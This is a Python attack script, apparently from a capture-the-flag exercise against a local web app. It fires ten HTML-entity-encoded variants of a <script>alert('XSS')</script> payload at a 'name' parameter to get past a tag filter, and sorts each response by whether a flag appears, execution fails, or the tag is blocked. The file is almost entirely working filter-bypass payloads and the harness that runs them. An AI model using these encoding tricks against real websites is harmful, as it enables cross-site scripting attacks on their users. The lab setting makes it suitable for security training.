import requests
import urllib.parse

target = "http://127.0.0.1:32889/page"

# Comprehensive HTML entity encoding variations for <script>alert('XSS')</script>
payloads = [
    # Mixed encoding variations
    "&#60;script>alert('XSS')</script>",  # Only < encoded (decimal)
    "<script&#62;alert('XSS')</script>",  # Only > encoded (decimal)
    "&#60;&#115;cript>alert('XSS')</&#115;cript>",  # < and s encoded
    "&#60;&#115;&#99;ript>alert('XSS')</&#115;&#99;ript>",  # Multiple chars encoded
    "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;alert('XSS')&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;",  # Mixed named and decimal
    "&#x3c;&#x73;cript>alert('XSS')</&#x73;cript>",  # Hex encoding
    "&#X3C;script>alert('XSS')</script>",  # Uppercase hex
    "&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;>alert('XSS')&#x3c;/&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;>",  # Full hex
    # Zero-padded variations
    "&#0000060;script>alert('XSS')</script>",  # Zero-padded decimal
    "&#x0003c;script>alert('XSS')</script>",  # Zero-padded hex
]

results = []
for payload in payloads:
    try:
        response = requests.get(target, params={'name': payload}, timeout=5)
        
        # Check response indicators
        if "FLAG{" in response.text:
            results.append(f"✓ SUCCESS - FLAG FOUND: {payload[:50]}")
            print(f"FLAG FOUND with payload: {payload}")
            print(response.text)
        elif "Failed! Try again!" in response.text:
            results.append(f"→ EXECUTED (wrong string): {payload[:50]}... | {len(response.content)} bytes")
        elif "Sorry, you can't use that tag" in response.text:
            results.append(f"✗ BLOCKED: {payload[:50]}... | {len(response.content)} bytes")
        else:
            results.append(f"? UNKNOWN: {payload[:50]}... | {len(response.content)} bytes")
    except Exception as e:
        results.append(f"✗ ERROR: {payload[:50]}... | {str(e)}")

print("\n" + "="*70)
print("HTML ENTITY ENCODING BYPASS TEST RESULTS")
print("="*70)
for r in results:
    print(r)
print("="*70)

